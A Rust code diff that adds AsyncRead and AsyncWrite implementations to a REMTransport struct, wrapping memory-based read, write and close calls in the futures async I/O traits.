@@ -5,7 +5,10 @@ use futures::channel::oneshot;
 use malefic_helper::common::rem;
 use malefic_helper::debug;
 use std::io;
+use std::pin::Pin;
+use std::task::{Context, Poll};
 use std::thread;
+use futures::{AsyncRead, AsyncWrite};
 
 pub struct REMTransport {
     handle: i32,
@@ -76,6 +79,51 @@ impl TransportTrait for REMTransport {
         rem::memory_close(self.handle)
             .map_err(|e| anyhow::anyhow!("{}", e))
             .map(|_| true)
+    }
+}
+
+impl AsyncRead for REMTransport {
+    fn poll_read(
+        mut self: Pin<&mut Self>,
+        _cx: &mut Context<'_>,
+        buf: &mut [u8],
+    ) -> Poll<io::Result<usize>> {
+        match rem::memory_read(self.handle, buf) {
+            Ok(n) => Poll::Ready(Ok(n)),
+            Err(e) => {
+                Poll::Ready(Err(io::Error::new(io::ErrorKind::Other, e)))
+            }
+        }
+    }
+}
+
+impl AsyncWrite for REMTransport {
+    fn poll_write(
+        mut self: Pin<&mut Self>,
+        _cx: &mut Context<'_>,
+        buf: &[u8],
+    ) -> Poll<io::Result<usize>> {
+        match rem::memory_write(self.handle, buf) {
+            Ok(n) => Poll::Ready(Ok(n)),
+            Err(e) => {
+                Poll::Ready(Err(io::Error::new(io::ErrorKind::Other, e)))
+            }
+        }
+    }
+
+    fn poll_flush(self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
+        Poll::Ready(Ok(()))
+    }
+
+    fn poll_close(mut self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
+        match rem::memory_close(self.handle) {
+            Ok(_) => {
+                Poll::Ready(Ok(()))
+            }
+            Err(e) => {
+                Poll::Ready(Err(io::Error::new(io::ErrorKind::Other, e)))
+            }
+        }
     }
 }
 
